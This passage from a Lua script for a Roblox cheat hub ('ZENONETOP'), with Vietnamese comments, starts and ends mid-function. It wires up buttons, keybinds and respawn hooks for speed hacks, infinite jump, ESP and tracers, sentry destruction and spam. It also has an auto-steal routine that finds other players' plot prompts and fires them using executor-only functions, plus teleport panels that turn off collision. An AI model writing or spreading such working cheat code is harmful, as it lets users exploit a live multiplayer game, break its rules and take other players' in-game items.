	makeModeBtn("Normal", 1)
	makeModeBtn("Lagger", 2)
	makeModeBtn("Custom", 3)
	-- Full Speed V2 GUI bar
	pcall(function()
 if ModeGui then
 for _, ch in ipairs(ModeGui:GetChildren()) do
 if ch:IsA("Frame") and tostring(ch.Name):match("^M_") then
 ch.Visible = false
 end
 end
 end
 if _G.ZenonetopBuildV2ModeBar then _G.ZenonetopBuildV2ModeBar() end
 if St.speedOn then
 currentSpeedValue = getActiveMoveSpeed()
 pcall(startSpeedBoost)
 end
	end)
	makeActBtn("drop", "DROP", UDim2.new(1, -150, 0.5, -40), function() runDrop() if _G.ZenonetopCounterOnDrop then pcall(_G.ZenonetopCounterOnDrop) end end)
	makeActBtn("insta", "INSTA\nRESET", UDim2.new(1, -80, 0.5, -40), doInstaReset)
	makeActBtn("tp", "TP\nDOWN", UDim2.new(1, -80, 0.5, 30), function() doTPDown(true) end)
	makeActBtn("sentry", "SENTRY", UDim2.new(1, -150, 0.5, 30), function()
 local on = not (St.destroySentry == true)
 if type(setDestroySentry) == "function" then
 setDestroySentry(on)
 else
 St.destroySentry = on
 end
 if _G.ZenonetopRefreshSentryBtn then pcall(_G.ZenonetopRefreshSentryBtn) end
	end)
	makeActBtn("steal", "AUTO\nSTEAL", UDim2.new(1, -150, 0.5, 100), function()
 local on = not (St.autoSteal == true)
 if type(setAutoSteal) == "function" then
 setAutoSteal(on)
 elseif type(_G.setAutoSteal) == "function" then
 _G.setAutoSteal(on)
 else
 St.autoSteal = on
 autoStealEnabled = on
 if on and startAutoSteal then startAutoSteal() elseif stopAutoSteal then stopAutoSteal() end
 end
 if _G.ZenonetopRefreshStealBtn then pcall(_G.ZenonetopRefreshStealBtn) end
 if ToggleRefs and ToggleRefs.autoSteal and ToggleRefs.autoSteal.setVisual then
 pcall(ToggleRefs.autoSteal.setVisual, St.autoSteal == true)
 end
	end)
	-- restore saved positions
	for key, e in pairs(actRefs) do
 if e.holder then restorePos(e.holder, "A_" .. key) end
	end
	for key, e in pairs(modeRefs) do
 if e.holder then restorePos(e.holder, "M_" .. key) end
	end
	_G.ZenonetopRefreshModeBar()
	_G.ZenonetopRefreshSentryBtn()
	if _G.ZenonetopRefreshStealBtn then pcall(_G.ZenonetopRefreshStealBtn) end
end



-- Empire-style: nút ON = xanh đậm rõ, OFF = tối
function applyActBtnState(btn, on, onText, offText)
	if not btn then return end
	on = on and true or false
	if on then
 -- Xanh đậm khi BẬT
 btn.BackgroundColor3 = Color3.fromRGB(0, 130, 45)
 btn.BackgroundTransparency = 0
 btn.TextColor3 = Color3.fromRGB(255, 255, 255)
 if onText then btn.Text = onText end
 local bgImg = btn:FindFirstChild("BtnBgImage")
 if bgImg then bgImg.ImageTransparency = 0.75 end
 local dim = btn:FindFirstChild("BtnDim")
 if not dim then
 dim = Instance.new("Frame")
 dim.Name = "BtnDim"
 dim.Size = UDim2.new(1, 0, 1, 0)
 dim.BorderSizePixel = 0
 dim.ZIndex = (btn.ZIndex or 100) + 1
 dim.Active = false
 dim.Parent = btn
 local dc = Instance.new("UICorner")
 dc.CornerRadius = UDim.new(0, 8)
 dc.Parent = dim
 end
 dim.BackgroundColor3 = Color3.fromRGB(0, 120, 40)
 dim.BackgroundTransparency = 0.15
 dim.Visible = true
 local tl = btn:FindFirstChild("BtnTextOverlay")
 if tl then
 if onText then tl.Text = onText end
 tl.TextColor3 = Color3.fromRGB(255, 255, 255)
 tl.TextStrokeTransparency = 0.2
 tl.ZIndex = (btn.ZIndex or 100) + 6
 end
 local st = btn:FindFirstChild("BtnBorder") or btn:FindFirstChildOfClass("UIStroke")
 if st then st.Color = Color3.fromRGB(40, 255, 100); st.Transparency = 0; st.Thickness = 2.5 end
	else
 btn.BackgroundColor3 = C.btnOff or Color3.fromRGB(16, 16, 22)
 btn.BackgroundTransparency = 0.35
 btn.TextColor3 = Color3.fromRGB(255, 255, 255)
 if offText then btn.Text = offText end
 local bgImg = btn:FindFirstChild("BtnBgImage")
 if bgImg then bgImg.ImageTransparency = 0.08 end
 local dim = btn:FindFirstChild("BtnDim")
 if dim then
 dim.BackgroundColor3 = Color3.new(0, 0, 0)
 dim.BackgroundTransparency = 0.45
 end
 local tl = btn:FindFirstChild("BtnTextOverlay")
 if tl then
 if offText then tl.Text = offText end
 tl.TextColor3 = Color3.fromRGB(255, 255, 255)
 tl.TextStrokeTransparency = 0.35
 end
 local st = btn:FindFirstChildOfClass("UIStroke")
 if st then st.Color = Color3.fromRGB(255, 80, 180); st.Transparency = 0.2; st.Thickness = 1.6 end
	end
end

function _G.ZenonetopRefreshStealBtn()
	local e = actRefs and actRefs.steal
	if not e or not e.holder then return end
	local show = (St.showStealBtn ~= false)
	e.holder.Visible = show
	if e.btn then
 e.btn.Visible = show
 applyActBtnState(e.btn, St.autoSteal == true, "STEAL\nON", "AUTO\nSTEAL")
	end
end

function _G.ZenonetopRefreshSentryBtn()
	local e = actRefs and actRefs.sentry
	if e and e.btn then
 applyActBtnState(e.btn, St.destroySentry == true, "SENTRY\nON", "SENTRY")
	end
end


function _G.ZenonetopRefreshModeBar()
	for n, e in pairs(modeRefs) do
 if e and e.btn then
 local on = St.activeMode == n
 applyCorner(e.btn, "Pill")
 if on then
 e.btn.BackgroundColor3 = C.modeOnBg or Color3.fromRGB(255, 20, 147)
 e.btn.BackgroundTransparency = 0
 e.btn.TextColor3 = C.modeOnTxt or Color3.fromRGB(255, 255, 255)
 local tl = e.btn:FindFirstChild("BtnTextOverlay")
 if tl then
 tl.TextColor3 = Color3.fromRGB(255, 255, 255)
 tl.Text = n
 end
 local st = e.btn:FindFirstChildOfClass("UIStroke")
 if st then st.Color = Color3.fromRGB(255, 120, 200); st.Transparency = 0.05 end
 else
 e.btn.BackgroundColor3 = C.modeOffBg or Color3.fromRGB(255, 255, 255)
 e.btn.BackgroundTransparency = 0
 e.btn.TextColor3 = C.modeOffTxt or Color3.fromRGB(25, 25, 30)
 local tl = e.btn:FindFirstChild("BtnTextOverlay")
 if tl then
 tl.TextColor3 = Color3.fromRGB(25, 25, 30)
 tl.Text = n
 end
 local st = e.btn:FindFirstChildOfClass("UIStroke")
 if st then st.Color = Color3.fromRGB(200, 200, 210); st.Transparency = 0.2 end
 end
 end
	end
end

-- Cập nhật size + shape TRỰC TIẾP (không destroy → giữ vị trí kéo)
_G.ZenonetopForceApplyShape = function(shape)
	shape = shape or (St and St.btnShape) or "Square"
	if St then St.btnShape = shape end
	local refs = actRefs
	if type(refs) ~= "table" then return end
	for key, e in pairs(refs) do
 if e and e.btn then
 pcall(function()
 applyCorner(e.btn, shape)
 if applyCornerToChildren then applyCornerToChildren(e.btn, shape) end
 end)
 end
	end
end

function _G.ZenonetopUpdateMobileVisuals()
	for n, e in pairs(modeRefs) do
 if e and e.holder and e.btn then
 local sc = tonumber(St.btnScale) or 1
 local w = math.max(80, math.floor(98 * sc))
 local h = math.max(32, math.floor(36 * sc))
 e.holder.Size = UDim2.new(0, w, 0, h)
 e.btn.TextSize = math.clamp(math.floor(h * 0.36), 11, 14)
 local c = e.btn:FindFirstChildOfClass("UICorner") or Instance.new("UICorner", e.btn)
 c.CornerRadius = UDim.new(0, 12) -- V2 bo góc chữ nhật
 if e.style then e.style(St.activeMode == n) end
 end
	end
	for key, e in pairs(actRefs) do
 if e and e.holder and e.btn then
 local base = (St.btnSizes[key] or 50)
 if key == "steal" or key == "sentry" then base = math.max(base, 56) end
 local sz = math.max(28, math.floor(base * (St.btnScale or 1)))
 e.holder.Size = UDim2.new(0, sz, 0, sz)
 e.btn.TextSize = math.clamp(math.floor(sz * 0.22), 10, 16)
 applyCorner(e.btn, St.btnShape or "Round")
 applyCornerToChildren(e.btn, St.btnShape or "Round")
 -- viền
 local s = e.btn:FindFirstChild("BtnBorder") or e.btn:FindFirstChildOfClass("UIStroke")
 if not s then
 s = Instance.new("UIStroke")
 s.Name = "BtnBorder"
 s.Parent = e.btn
 end
 s.Color = Color3.fromRGB(220, 220, 235)
 s.Thickness = 2
 s.Transparency = 0.15
 end
	end
	if _G.ZenonetopRefreshModeBar then pcall(_G.ZenonetopRefreshModeBar) end
	if _G.ZenonetopRefreshSentryBtn then pcall(_G.ZenonetopRefreshSentryBtn) end
	if _G.ZenonetopRefreshStealBtn then pcall(_G.ZenonetopRefreshStealBtn) end
	-- Scale Speed V2 mode bar
	pcall(function()
 local gui = PlayerGui:FindFirstChild("ZenonetopV2ModeBar")
 if not gui then return end
 local sc = tonumber(St.btnScale) or 1
 local modeSz = tonumber(St.btnSizes and St.btnSizes.mode) or 50
 -- Size Speed 3Mode: tăng chiều cao; width ổn định
 local h = math.max(28, math.floor(modeSz * sc))
 local w = math.max(72, math.floor(88 * sc))
 for _, holder in ipairs(gui:GetChildren()) do
 if holder:IsA("Frame") and holder.Name:match("^V2MH_") then
 holder.Size = UDim2.new(0, w, 0, h)
 local btn = holder:FindFirstChildWhichIsA("TextButton")
 if btn then
 btn.TextSize = math.clamp(math.floor(h * 0.36), 9, 16)
 end
 end
 end
	end)
end

function _G.ZenonetopApplyMobile()
	ModeGui.Enabled = St.mobileBtns == true
	ActGui.Enabled = St.mobileBtns == true
	local hasMode = next(modeRefs) ~= nil
	local hasAct = next(actRefs) ~= nil
	if not hasMode or not hasAct then
 rebuildMobile()
	end
	-- luôn áp shape/size (Box/Round/Square) kể cả khi đã có nút
	if _G.ZenonetopUpdateMobileVisuals then pcall(_G.ZenonetopUpdateMobileVisuals) end
end
function _G.ZenonetopResetMobilePos()
	St._btnPos = {}
	rebuildMobile()
	pcall(saveCfg)
end
_G.ZenonetopApplyMobile()

----------------------------------------------------------------
-- KEYBINDS (Drop / TP / Insta / Mode) — no menu toggle key
----------------------------------------------------------------
UIS.InputBegan:Connect(function(input, gp)
	if gp or listening then return end
	if input.UserInputType ~= Enum.UserInputType.Keyboard then return end
	local k = input.KeyCode
	if k == St.keys.Drop then runDrop()
	elseif k == St.keys.TPDown then doTPDown(true)
	elseif k == St.keys.InstaReset then doInstaReset()
	elseif k == St.keys.DestroySentry then setDestroySentry(not St.destroySentry)
	elseif St.keys.AutoSteal and k == St.keys.AutoSteal then
 if type(setAutoSteal) == "function" then
 setAutoSteal(not (St.autoSteal == true))
 -- sync toggle UI
 if ToggleRefs and ToggleRefs.autoSteal and ToggleRefs.autoSteal.setVisual then
 pcall(ToggleRefs.autoSteal.setVisual, St.autoSteal == true)
 end
 end
	else
 for name, m in pairs(St.modes) do
 if m.key == k then setActiveMode(name) break end
 end
	end
end)

----------------------------------------------------------------
-- BOOT
----------------------------------------------------------------

-- ============================================================
-- REAPPLY ALL LOGIC (fix/rejoin/respawn) — không nút ảo
-- ============================================================
function reapplyAllLogic(reason)
	reason = tostring(reason or "boot")
	-- Speed
	pcall(function()
 if St.speedOn then
 -- force restart loop
 if speedConnection then
 pcall(function() speedConnection:Disconnect() end)
 speedConnection = nil
 end
 startSpeedBoost()
 if St.activeMode and setActiveMode then setActiveMode(St.activeMode) end
 else
 if stopSpeedBoost then stopSpeedBoost() end
 end
	end)
	-- Inf Jump
	pcall(function()
 if St.infJump then
 InfJumpState.enabled = true
 InfJumpState.mode = St.infJumpMode or "hold"
 if startInfJump then startInfJump() elseif setInfJump then setInfJump(true) end
 else
 if stopInfJump then stopInfJump() end
 end
	end)
	-- Anti ragdoll
	pcall(function()
 if St.antiRagdoll then
 if AntiRagdollV2 then AntiRagdollV2.Enabled = true end
 if startAntiRagdoll then startAntiRagdoll() end
 else
 if stopAntiRagdoll then stopAntiRagdoll() end
 end
	end)
	-- Anti FX flags
	pcall(function()
 if AntiFX then
 AntiFX.gummy = true
 AntiFX.boogie = true
 AntiFX.paint = true
 St.antiGummy = true
 St.antiBoogie = true
 St.antiPaint = true
 end
	end)
	-- Tool aim + rehook
	pcall(function()
 if St.toolAim then
 aimOn = true
 local char = LP.Character
 if char and watchTools then watchTools(char) end
 local bp = LP:FindFirstChild("Backpack")
 if bp and watchTools then watchTools(bp) end
 else
 aimOn = false
 end
	end)
	-- Destroy sentry
	pcall(function()
 if St.destroySentry and setDestroySentry then setDestroySentry(true) end
	end)
	-- ESP / tracer / antilag
	pcall(function() if St.esp and setESP then setESP(true) end end)
	pcall(function() if St.tracer and setTracer then setTracer(true) end end)
	pcall(function() if St.antiLag and setAntiLag then setAntiLag(true) end end)
	-- Spam
	pcall(function() if St.spamLaser and setSpamLaser then setSpamLaser(true) end end)
	pcall(function() if St.spamPaint and setSpamPaint then setSpamPaint(true) end end)
	-- Auto steal
	pcall(function()
 if St.autoSteal then
 if type(setAutoSteal) == "function" then setAutoSteal(true) end
 if _G.ZenonetopSyncAutoSteal then pcall(_G.ZenonetopSyncAutoSteal) end
 end
	end)
	-- Ragdoll TP
	pcall(function()
	end)
	-- Mobile buttons
	pcall(function()
 if ModeGui then ModeGui.Enabled = St.mobileBtns == true end
 if ActGui then ActGui.Enabled = St.mobileBtns == true end
 if _G.ZenonetopApplyMobile then pcall(_G.ZenonetopApplyMobile) end
	end)
	-- Sync toggle UI + ép logic chạy nếu đang ON
	pcall(function()
 for name, ref in pairs(ToggleRefs or {}) do
 if ref and St[name] ~= nil then
 local on = St[name] == true
 if ref.setVisual then
 pcall(ref.setVisual, on)
 end
 end
 end
	end)
end
_G.ZenonetopReapplyAllLogic = reapplyAllLogic


-- Re-apply ALL saved states so toggles that show ON actually work
pcall(function() setAntiGummy(St.antiGummy ~= false) end)
pcall(function() setAntiBoogie(St.antiBoogie ~= false) end)
pcall(function() setAntiPaint(St.antiPaint ~= false) end)
pcall(function() setAntiRagdoll(St.antiRagdoll == true) end)
pcall(function() setToolAim(St.toolAim ~= false) end)
pcall(function() setInfJump(St.infJump ~= false) end)
pcall(function() setDestroySentry(St.destroySentry == true) end)
pcall(function() setSpeedOn(St.speedOn ~= false) end)
pcall(function() setActiveMode(St.activeMode or "Normal") end)
pcall(function() setESP(St.esp == true) end)
pcall(function() setTracer(St.tracer == true) end)
pcall(function() setAntiLag(St.antiLag == true) end)
pcall(function() setSpamLaser(St.spamLaser == true) end)
pcall(function() setSpamPaint(St.spamPaint == true) end)
-- Auto Steal after setups exist
task.defer(function()
	pcall(function()
 if type(setAutoSteal) == "function" then
 setAutoSteal(St.autoSteal == true)
 end
 if St.autoSteal and _G.ZenonetopSyncAutoSteal then
 pcall(_G.ZenonetopSyncAutoSteal)
 end
	end)
end)
pcall(applyMenuScale)
pcall(function() setTab("Player") end)
task.defer(function()
	task.wait(0.6)
	pcall(function() if reapplyAllLogic then reapplyAllLogic("boot") end end)
end)
task.defer(function()
	-- rejoin server: re-apply sau 2s (chờ character/plot load)
	task.wait(2)
	pcall(function() if reapplyAllLogic then reapplyAllLogic("boot-delayed") end end)
end)
-- Sync toggle UI to match actual state
task.defer(function()
	-- sync toggle UI
	for name, ref in pairs(ToggleRefs or {}) do
 if ref and ref.set and St[name] ~= nil then
 pcall(function() ref.set(St[name] == true) end)
 end
	end
	-- force-apply runtime features (sau load / rejoin) — logic thật, không chỉ UI
	pcall(function() if St.speedOn and startSpeedBoost then startSpeedBoost() end end)
	pcall(function() if St.antiRagdoll and startAntiRagdoll then startAntiRagdoll() end end)
	pcall(function()
 if St.infJump then
 InfJumpState.enabled = true
 InfJumpState.mode = St.infJumpMode or "hold"
 end
	end)
	pcall(function() if St.toolAim and setToolAim then setToolAim(true) end end)
	pcall(function()
 if ModeGui then ModeGui.Enabled = St.mobileBtns == true end
 if ActGui then ActGui.Enabled = St.mobileBtns == true end
 if next(modeRefs) == nil or next(actRefs) == nil then
 if _G.ZenonetopApplyMobile then _G.ZenonetopApplyMobile() end
 end
	end)
	pcall(function() if St.activeMode and setActiveMode then setActiveMode(St.activeMode) end end)
	pcall(function() if St.autoSteal and type(setAutoSteal) == "function" then setAutoSteal(true) end end)
	pcall(function() if St.destroySentry and setDestroySentry then setDestroySentry(true) end end)
end)


-- Re-apply features on respawn / rejoin (full logic, không nút ảo)
if _G._VisHubCharReapplyConn then
	pcall(function() _G._VisHubCharReapplyConn:Disconnect() end)
	_G._VisHubCharReapplyConn = nil
end
_G._VisHubCharReapplyConn = LP.CharacterAdded:Connect(function(char)
	task.wait(0.4)
	pcall(function()
 if reapplyAllLogic then
 reapplyAllLogic("CharacterAdded")
 else
 if St.speedOn and startSpeedBoost then
 if speedConnection then pcall(function() speedConnection:Disconnect() end); speedConnection = nil end
 startSpeedBoost()
 end
 if St.infJump and setInfJump then setInfJump(true) end
 if St.antiRagdoll and startAntiRagdoll then startAntiRagdoll() end
 if St.toolAim and setToolAim then setToolAim(true) end
 if St.autoSteal and _G.ZenonetopSyncAutoSteal then pcall(_G.ZenonetopSyncAutoSteal) end
 end
	end)
end)

print("[ZENONETOP Full] Player(Anti+Speed S2+Aim+Drop+Insta) | ESP | Settings mobile/lock/shape/size")



-- ============================================================
-- EXTENSION: InfJump 2-mode | Auto Steal V1/V2 | Steal Bar | Panel TP
-- ============================================================

-- InfJump mode: hold | manual
St.infJumpMode = St.infJumpMode or "hold"
-- setInfJumpMode already defined above

function isMyPlot(plotName)
	local plots = workspace:FindFirstChild("Plots")
	local plot = plots and plots:FindFirstChild(plotName)
	if not plot then return false end
	local sign = plot:FindFirstChild("PlotSign")
	local yb = sign and sign:FindFirstChild("YourBase")
	return yb and yb:IsA("BillboardGui") and yb.Enabled
end

function findStealPrompt()
	local char = LP.Character
	local root = char and char:FindFirstChild("HumanoidRootPart")
	if not root then return nil, nil end
	local radius = St.stealRadius or 60
	local best, bestDist, bestPart = nil, math.huge, nil
	local function consider(d)
 if not isStealAction(d) then return end
 if d.Enabled == false then return end
 if LP.Character and d:IsDescendantOf(LP.Character) then return end
 local part = d.Parent
 local basePart = part and (part:IsA("BasePart") and part
 or part:FindFirstChildWhichIsA("BasePart", true)
 or d:FindFirstAncestorWhichIsA("BasePart"))
 if not basePart then return end
 local plot = d
 for _ = 1, 8 do
 if not plot.Parent or plot.Parent == workspace then break end
 plot = plot.Parent
 if isOwnPlot(plot) then return end
 end
 local dist = (basePart.Position - root.Position).Magnitude
 if dist <= radius and dist < bestDist then
 best, bestDist, bestPart = d, dist, basePart
 end
	end
	local plots = workspace:FindFirstChild("Plots") or workspace:FindFirstChild("plots")
	if plots then
 for _, plot in ipairs(plots:GetChildren()) do
 if not isOwnPlot(plot) then
 for _, d in ipairs(plot:GetDescendants()) do
 if d:IsA("ProximityPrompt") then consider(d) end
 end
 end
 end
	else
 for _, d in ipairs(workspace:GetDescendants()) do
 if d:IsA("ProximityPrompt") then consider(d) end
 end
	end
	return best, bestPart
end

function fireSteal(prompt)
	if not prompt then return end
	if not StealA.data[prompt] then
 StealA.data[prompt] = { hold = {}, trigger = {} }
 if getconnections then
 pcall(function()
 for _, c in ipairs(getconnections(prompt.PromptButtonHoldBegan) or {}) do
 if c.Function then table.insert(StealA.data[prompt].hold, c.Function) end
 end
 for _, c in ipairs(getconnections(prompt.Triggered) or {}) do
 if c.Function then table.insert(StealA.data[prompt].trigger, c.Function) end
 end
 end)
 end
	end
	local data = StealA.data[prompt]
	for _, fn in ipairs(data.hold) do task.spawn(fn) end
	for _, fn in ipairs(data.trigger) do task.spawn(fn) end
	if #data.hold == 0 and #data.trigger == 0 and fireproximityprompt then
 pcall(function() fireproximityprompt(prompt) end)
	end
end

function executeStealV1(prompt, part)
	if StealA.busy or not prompt then return end
	StealA.busy = true
	local dur = St.stealDuration or 1.4
	local pauseOn = St.stealPause == true
	local pausePct = (St.stealPausePct or 75) / 100
	local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
	local function stillInRange()
 if not prompt or not prompt.Parent or not part or not part.Parent then return false end
 local r = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
 if not r then return false end
 return (r.Position - part.Position).Magnitude <= (St.stealRadius or 60)
	end
	local function closeEnough()
 local r = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
 if not r or not part then return false end
 return (r.Position - part.Position).Magnitude <= 3
	end

	task.spawn(function()
 -- hold begin
 for _, fn in ipairs((StealA.data[prompt] and StealA.data[prompt].hold) or {}) do
 task.spawn(fn)
 end
 if fireproximityprompt then pcall(function() fireproximityprompt(prompt, dur) end) end

 if pauseOn then
 -- 0 → pausePct, wait close, then → 100%
 local t0 = tick()
 while tick() - t0 < dur * pausePct do
 if not StealA.enabled or not stillInRange() then
 _G.ZenonetopStealBar.Reset()
 StealA.busy = false
 return
 end
 local p = (tick() - t0) / dur
 _G.ZenonetopStealBar.Set(math.clamp(p, 0, pausePct), "STEALING")
 task.wait()
 end
 _G.ZenonetopStealBar.Set(pausePct, "WAIT")
 -- wait until close
 while StealA.enabled and stillInRange() and not closeEnough() do
 _G.ZenonetopStealBar.Set(pausePct, "WAIT")
 task.wait(0.05)
 end
 if not StealA.enabled or not stillInRange() then
 _G.ZenonetopStealBar.Reset()
 StealA.busy = false
 return
 end
 local t1 = tick()
 local remain = dur * (1 - pausePct)
 while tick() - t1 < remain do
 if not StealA.enabled or not stillInRange() then
 _G.ZenonetopStealBar.Reset()
 StealA.busy = false
 return
 end
 local p = pausePct + (tick() - t1) / remain * (1 - pausePct)
 _G.ZenonetopStealBar.Set(p, "STEALING")
 task.wait()
 end
 else
 -- continuous 0-100 loop while in radius
 while StealA.enabled and stillInRange() do
 local t0 = tick()
 while tick() - t0 < dur do
 if not StealA.enabled or not stillInRange() then
 _G.ZenonetopStealBar.Reset()
 StealA.busy = false
 return
 end
 _G.ZenonetopStealBar.Set((tick() - t0) / dur, "STEALING")
 task.wait()
 end
 _G.ZenonetopStealBar.Set(1, "SUCCESS")
 fireSteal(prompt)
 _G.ZenonetopStealBar.Reset() -- 100% → 0 ngay, loop tiếp trong radius
 end
 StealA.busy = false
 return
 end
 _G.ZenonetopStealBar.Set(1, "SUCCESS")
 fireSteal(prompt)
 _G.ZenonetopStealBar.Reset() -- 100% → 0 ngay
 StealA.busy = false
 -- tiếp tục nếu còn trong radius (heartbeat startAutoSteal sẽ pick lại)
	end)
end

function executeStealV2(prompt, part)
	-- V2: hold full then trigger when in range (simpler BloodHounds-like)
	if StealA.busy or not prompt then return end
	StealA.busy = true
	local dur = St.stealDuration or 1.4
	task.spawn(function()
 local t0 = tick()
 while tick() - t0 < dur do
 if not StealA.enabled then
 _G.ZenonetopStealBar.Reset()
 StealA.busy = false
 return
 end
 local r = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
 if not r or not part or not part.Parent then
 _G.ZenonetopStealBar.Reset()
 StealA.busy = false
 return
 end
 if (r.Position - part.Position).Magnitude > (St.stealRadius or 60) then
 _G.ZenonetopStealBar.Reset()
 StealA.busy = false
 return
 end
 _G.ZenonetopStealBar.Set((tick() - t0) / dur, "STEALING")
 task.wait()
 end
 _G.ZenonetopStealBar.Set(1, "SUCCESS")
 fireSteal(prompt)
 _G.ZenonetopStealBar.Reset() -- 100% → 0 ngay
 StealA.busy = false
	end)
end

function startAutoSteal()
	StealA.enabled = true
	if StealA.conn then return end
	StealA.conn = RS.Heartbeat:Connect(function()
 if not StealA.enabled or StealA.busy then return end
 local prompt, part = findStealPrompt()
 if prompt then
 if St.stealVer == "V2" then
 executeStealV2(prompt, part)
 else
 executeStealV1(prompt, part)
 end
 end
	end)
end
function stopAutoSteal()
	StealA.enabled = false
	StealA.busy = false
	if StealA.conn then pcall(function() StealA.conn:Disconnect() end) StealA.conn = nil end
	-- Chỉ về 0%, KHÔNG ẩn / destroy steal bar
	_G.AceStealBarProgress = 0
	pcall(function() if _G.StealBar and _G.StealBar.Reset then _G.StealBar.Reset() end end)
	pcall(function() if _G.ZenonetopStealBar and _G.ZenonetopStealBar.Reset then _G.ZenonetopStealBar.Reset() end end)
end
function setAutoSteal(on)
	-- exported below
	St.autoSteal = on and true or false
	autoStealEnabled = St.autoSteal
	autoStealRadius = tonumber(St.stealRadius) or 60
	selectedStealMode = St.stealVer or "V1"
	if St.autoSteal then startAutoSteal() else stopAutoSteal() end
	if _G.ZenonetopSyncAutoSteal then pcall(_G.ZenonetopSyncAutoSteal) end
	if _G.ZenonetopRefreshStealBtn then pcall(_G.ZenonetopRefreshStealBtn) end
	-- đảm bảo nút mobile tồn tại
	if St.autoSteal and (not actRefs or not actRefs.steal) and _G.ZenonetopApplyMobile then
 pcall(_G.ZenonetopApplyMobile)
	end
	saveCfg()
end

----------------------------------------------------------------
-- PANEL TP (from ZENONETOP, no music / no image / no sentry)
----------------------------------------------------------------
local TP = {
	base = nil, pet = nil,
	delayBase = 0.07, delayPet = 0.07,
	key = Enum.KeyCode.X,
	busy = false, markers = {},
}

_G.setAutoSteal = setAutoSteal
_G.setDestroySentry = setDestroySentry

function tpMarker(pos, col)
	local P = Instance.new("Part")
	P.Size = Vector3.new(3, 0.25, 3)
	P.Material = Enum.Material.Neon
	P.Anchored = true
	P.CanCollide = false
	P.Position = pos + Vector3.new(0, 2, 0)
	P.Color = col
	P.Name = "ZenonetopTP_SavePoint"
	P.Parent = workspace
	return P
end

function smoothTP(hrp, pos)
	hrp.AssemblyLinearVelocity = Vector3.zero
	hrp.AssemblyAngularVelocity = Vector3.zero
	local tw = TS:Create(hrp, TweenInfo.new(0.065, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
 CFrame = CFrame.new(pos),
	})
	tw:Play()
	tw.Completed:Wait()
end

function chilliTP(hrp, targetPos, char)
	if not hrp or not targetPos then return end
	local hum = char and char:FindFirstChildOfClass("Humanoid")
	-- equip carpet if any
	pcall(function()
 for _, n in ipairs({"Flying Carpet", "Carpet", "Cloud", "Witch's Broom"}) do
 local g = char:FindFirstChild(n) or LP.Backpack:FindFirstChild(n)
 if g and hum then hum:EquipTool(g) break end
 end
	end)
	task.wait(0.04)
	for _, p in ipairs(char:GetDescendants()) do
 if p:IsA("BasePart") then pcall(function() p.CanCollide = false end) end
	end
	if hum then pcall(function() hum.PlatformStand = true end) end
	local airHeight = 95
	local airPos = Vector3.new(targetPos.X, targetPos.Y + airHeight, targetPos.Z)
	hrp.CFrame = CFrame.new(airPos)
	hrp.AssemblyLinearVelocity = Vector3.new(0, -5, 0)
	task.wait(0.05)
	hrp.AssemblyLinearVelocity = Vector3.new(0, -220, 0)
	local landY = targetPos.Y + 3
	pcall(function()
 local params = RaycastParams.new()
 params.FilterType = Enum.RaycastFilterType.Exclude
 params.FilterDescendantsInstances = { char }
 local result = workspace:Raycast(airPos, Vector3.new(0, -(airHeight + 80), 0), params)
 if result then landY = result.Position.Y + 3.2 end
	end)
	local landPos = Vector3.new(targetPos.X, landY, targetPos.Z)
	local t0 = os.clock()
	while os.clock() - t0 < 0.55 do
 if not hrp.Parent then break end
 if hrp.Position.Y <= landY + 8 then break end
 hrp.AssemblyLinearVelocity = Vector3.new(0, -220, 0)
 task.wait()
	end
	for _ = 1, 6 do
 if not hrp.Parent then break end
 hrp.CFrame = CFrame.new(landPos)
 hrp.AssemblyLinearVelocity = Vector3.zero
 task.wait(0.03)
	end
	if hum then pcall(function() hum.PlatformStand = false end) end
	for _, p in ipairs(char:GetDescendants()) do
 if p:IsA("BasePart") then pcall(function() p.CanCollide = true end) end
	end
end

function runPanelTP()
	if TP.busy then return end
	if not TP.base and not TP.pet then
 showToast("Chua luu diem")
 return
	end
	local char = LP.Character
	local hrp = char and char:FindFirstChild("HumanoidRootPart")
	if not hrp then return end
	TP.busy = true
	task.spawn(function()
 pcall(function()
 if (TP.base and not TP.pet) or (TP.pet and not TP.base) then
 chilliTP(hrp, TP.base or TP.pet, char)
 else
 smoothTP(hrp, TP.base)
 task.wait(TP.delayBase)
 char = LP.Character or char
 hrp = char and char:FindFirstChild("HumanoidRootPart") or hrp
 if hrp and TP.pet then smoothTP(hrp, TP.pet) end
 end
 end)
 TP.busy = false
 if _G.ZenonetopRefreshTPBtn then _G.ZenonetopRefreshTPBtn() end
	end)
end

-- Panel TP GUI (popup)
function openPanelTP()
	local old = PlayerGui:FindFirstChild("ZenonetopPanelTP")
	if old then old:Destroy() end
	local gui = Instance.new("ScreenGui")
	gui.Name = "ZenonetopPanelTP"
	gui.ResetOnSpawn = false
	gui.IgnoreGuiInset = true
	gui.DisplayOrder = 130
	gui.Parent = PlayerGui
	local f = Instance.new("Frame")
	f.Size = UDim2.new(0, 260, 0, 320)
	f.Position = UDim2.new(0.5, -130, 0.5, -160)
	f.BackgroundColor3 = Color3.fromRGB(18, 18, 26)
	f.BorderSizePixel = 0
	f.Active = true
	f.Parent = gui
	Instance.new("UICorner", f).CornerRadius = UDim.new(0, 12)
	local st = Instance.new("UIStroke", f)
	st.Color = Color3.fromRGB(120, 90, 200)
	st.Thickness = 1.5
	-- drag
	local panelLocked = false
	do
 local dragging, dragStart, startPos
 f.InputBegan:Connect(function(input)
 if panelLocked then return end
 if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
 dragging = true
 dragStart = input.Position
 startPos = f.Position
 input.Changed:Connect(function()
 if input.UserInputState == Enum.UserInputState.End then
 dragging = false
 -- save panel pos
 St._panelTPPos = {f.Position.X.Scale, f.Position.X.Offset, f.Position.Y.Scale, f.Position.Y.Offset}
 saveCfg()
 end
 end)
 end
 end)
 UIS.InputChanged:Connect(function(input)
 if dragging and not panelLocked and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
 local d = input.Position - dragStart
 f.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
 end
 end)
	end
	local title = Instance.new("TextLabel")
	title.Size = UDim2.new(1, -120, 0, 32)
	title.Position = UDim2.new(0, 10, 0, 4)
	title.BackgroundTransparency = 1
	title.Text = "PANEL TP"
	title.TextColor3 = Color3.new(1, 1, 1)
